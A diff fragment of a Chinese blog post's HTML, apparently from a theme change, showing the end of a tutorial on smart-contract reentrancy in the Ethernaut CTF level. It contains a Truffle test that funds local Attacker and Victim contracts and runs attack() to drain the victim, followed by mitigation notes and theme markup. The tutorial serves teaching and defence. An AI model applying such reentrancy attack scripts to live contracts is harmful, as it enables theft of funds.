class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> attacker = artifacts.require(<span class="string">"Attacker"</span>);</span><br><span class="line"><span class="keyword">const</span> victim = artifacts.require(<span class="string">"Victim"</span>);</span><br><span class="line"></span><br><span class="line">contract(<span class="string">'test'</span>, <span class="keyword">async</span> (accounts) =&gt; &#123;</span><br><span class="line">    it(<span class="string">"should put 10 in attacker"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        acct1 = accounts[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: attacker.address, <span class="attr">value</span>: <span class="number">20</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> result= <span class="keyword">await</span> instance_att.donate.sendTransaction(options)</span><br><span class="line">        <span class="comment">// console.log(result);</span></span><br><span class="line">        <span class="built_in">console</span>.log(getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(attacker.address), <span class="number">20</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">     it(<span class="string">"should put 100 in victim"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance = <span class="keyword">await</span> victim.deployed();</span><br><span class="line">        acct1 = accounts[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: victim.address, <span class="attr">value</span>: <span class="number">100</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> result= web3.eth.sendTransaction(options)</span><br><span class="line">        <span class="comment">// console.log(result);</span></span><br><span class="line">        <span class="built_in">console</span>.log(getBalance(victim.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">100</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">    <span class="comment">//  it("show attacker and victim", async () =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     let getBalance = web3.eth.getBalance;</span></span><br><span class="line">    <span class="comment">//     console.log(getBalance(victim.address))</span></span><br><span class="line">    <span class="comment">//     console.log(getBalance(attacker.address))</span></span><br><span class="line">    <span class="comment">//     assert.equal(getBalance(victim.address), 100);</span></span><br><span class="line">    <span class="comment">//  &#125;),</span></span><br><span class="line">     it(<span class="string">"attack_ready (transfer 10)"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</span><br><span class="line">        <span class="built_in">console</span>.log(attacker.address)</span><br><span class="line">        <span class="built_in">console</span>.log(accounts[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.transfer.sendTransaction(victim.address,<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">110</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">     it(<span class="string">"attack (get 20)"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.attack()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">90</span>);</span><br><span class="line">     &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
 <p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fuud2rkcqtj30fn09qdga.jpg" alt="cr8.png"></p>
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>重入漏洞形成原因：</p>
 <ul>
@@ -452,210 +284,145 @@
 <li>不使用<code>call.value</code>，使用<code>transfer</code></li>
 <li>使用安全的加减函数，捕获溢出，形成回滚。</li>
 </ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2" target="_blank" rel="external">https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2</a><br><a href="https://bbs.pediy.com/thread-228422.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-228422.htm</a><br><a href="https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/" target="_blank" rel="external">https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/</a><br><a href="https://www.secpulse.com/archives/73682.html" target="_blank" rel="external">https://www.secpulse.com/archives/73682.html</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2" target="_blank" rel="noopener">https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2</a><br><a href="https://bbs.pediy.com/thread-228422.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228422.htm</a><br><a href="https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/</a><br><a href="https://www.secpulse.com/archives/73682.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/73682.html</a></p>
 
-      
-    </div>
-    
   </div>
-  
-    
-    <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/08/29/智能合约安全-重入攻击/">智能合约安全-重入攻击</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
-        <p><span>发布时间:</span>2018-08-29, 17:05:28</p>
-        <p><span>最后更新:</span>2018-09-01, 21:54:58</p>
-        <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/08/29/智能合约安全-重入攻击/" title="智能合约安全-重入攻击">http://lalajun.com/2018/08/29/智能合约安全-重入攻击/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2018/08/29/智能合约安全-重入攻击/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
-            <script> var clipboard = new Clipboard('.copy-path'); </script>
-        </p>
-        <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
-        </p>
-    </div>
-
-
-
-    <nav id="article-nav">
-        
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/09/15/0day-NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞/">
-                    0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞
-                </a>
-            </div>
-        
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/08/25/浏览器渲染原理与编码解码/">
-                    浏览器渲染原理与编码解码
-                </a>
-            </div>
-        
-    </nav>
-
-  
 </article>
 
-    <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
-        
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#重入攻击"><span class="toc-text">重入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#因-Fallback、足够Gas-重入"><span class="toc-text">因 Fallback、足够Gas 重入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写攻击合约"><span class="toc-text">编写攻击合约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#资产记录的修改在转币之后"><span class="toc-text">资产记录的修改在转币之后</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ethernaut重入题"><span class="toc-text">ethernaut重入题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基于Remix"><span class="toc-text">基于Remix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于truffle-本地测试"><span class="toc-text">基于truffle 本地测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
-        
-    </div>
-    <style>
-        .left-col .switch-btn,
-        .left-col .switch-area {
-            display: none;
-        }
-        .toc-level-3 i,
-        .toc-level-3 ol {
-            display: none !important;
-        }
-    </style>
-
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
-
-    <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
-    </script>
-
-
-
-
-
-    
-
-
-
-
-    <div class="scroll" id="post-nav-button">
-        
-            <a href="/2018/09/15/0day-NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞/" title="上一篇: 0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞">
-                <i class="fa fa-angle-left"></i>
-            </a>
-        
-
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
-
-        
-            <a href="/2018/08/25/浏览器渲染原理与编码解码/" title="下一篇: 浏览器渲染原理与编码解码">
-                <i class="fa fa-angle-right"></i>
-            </a>
-        
-    </div>
-
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/26/Tools-nmap/">Tools-nmap使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/15/0day-NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞/">0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/29/智能合约安全-重入攻击/">智能合约安全-重入攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/浏览器渲染原理与编码解码/">浏览器渲染原理与编码解码</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/15/NEO-搭建私有链/">NEO-搭建私有链</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/13/NEO-JAVA环境/">NEO-智能合约JAVA c#环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/DAPP开发中趟过的坑/">DAPP开发中趟过的坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/truffle_contact/">Truffle-Contract中间件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/truffle/">Truffle框架</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/Vue组件/">Vue-组件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/Vue/">Vue-基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/mysql-字符集漏洞/">Mysql-字符集漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/06/ZJGSCTF-2018-writeup/">ZJGSCTF-2018-web writup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/27/WEB-RPO攻击/">WEB-RPO攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/23/Ubuntu下Apache2、Mysql、php7搭建/">Ubuntu下Apache2、Mysql、php7搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/21/docker/">Docker使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/09/WEB-SQL报错注入/">WEB-SQL报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/26/WEB-网强杯 WEB writeup/">WEB-网强杯-WEB-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
-
-
-
-
-    <script>
-        
-    </script>
-</div>
-      <footer id="footer">
-    <div class="outer">
-        <div id="footer-info">
-            <div class="footer-left">
-                <i class="fa fa-copyright"></i> 
-                2017-2018 LaLa
-            </div>
-            <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
-            </div>
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
         </div>
-        
-            <div class="visit">
-                
-                    <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
-                        </span>
-                    </span>
-                
-                
-                    <span>| </span>
-                
-                
-                    <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    </span>
-                
-            </div>
-        
     </div>
-</footer>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
     </div>
-    
-<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
 
-    <script>
-        $(document).ready(function() {
-            var iPad = window.navigator.userAgent.indexOf('iPad');
-            if (iPad > -1 || $(".left-col").css("display") === "none") {
-                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
-                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
-                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
-            }
-            else {
-                var backgroundnum = 5;
-                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
-                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
-            }
-        })
-    </script>
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#重入攻击"><span class="toc-number">2.</span> <span class="toc-text">重入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#因-Fallback、足够Gas-重入"><span class="toc-number">2.1.</span> <span class="toc-text">因 Fallback、足够Gas 重入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写攻击合约"><span class="toc-number">2.2.</span> <span class="toc-text">编写攻击合约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#资产记录的修改在转币之后"><span class="toc-number">2.3.</span> <span class="toc-text">资产记录的修改在转币之后</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ethernaut重入题"><span class="toc-number">3.</span> <span class="toc-text">ethernaut重入题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基于Remix"><span class="toc-number">3.1.</span> <span class="toc-text">基于Remix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于truffle-本地测试"><span class="toc-number">3.2.</span> <span class="toc-text">基于truffle 本地测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小结"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
 
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&text=智能合约安全-重入攻击"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&is_video=false&description=智能合约安全-重入攻击"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能合约安全-重入攻击&body=Check out this article: http://lalajun.com/2018/08/29/智能合约安全-重入攻击/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&title=智能合约安全-重入攻击"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2018/08/29/智能合约安全-重入攻击/&name=智能合约安全-重入攻击&description=&lt;p&gt;— 有意思，填一小块坑 —&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
+    </div>
 
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
 
-
-<div class="scroll" id="scroll">
-    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
-</div>
-<script>
-    // Open in New Window
-    
-        var oOpenInNew = {
-            
-            
-             post: ".article-entry a[href], .copyright a[href]", 
-            
-            
-            
-             archives: ".archive-article-title", 
-             miniArchives: "a.post-list-link", 
-            
-             friends: "#js-friends a", 
-             socail: ".social a" 
-        }
-        for (var x in oOpenInNew) {
-            $(oOpenInNew[x]).attr("target", "_blank");
-        }
-    
-</script>
-
-    <script>
-        var originTitle = document.title;
-        var titleTime;
-        document.addEventListener("visibilitychange", function() {
-            if (document.hidden) {
-                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
-                clearTimeout(titleTime);
-            }
-            else {
-                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
-                titleTime = setTimeout(function() {
-                    document.title = originTitle;
-                }, 2000);
-            }
-        })
-    </script>
-
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
   </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 LaLa
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lalajun';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
 </body>
 </html>
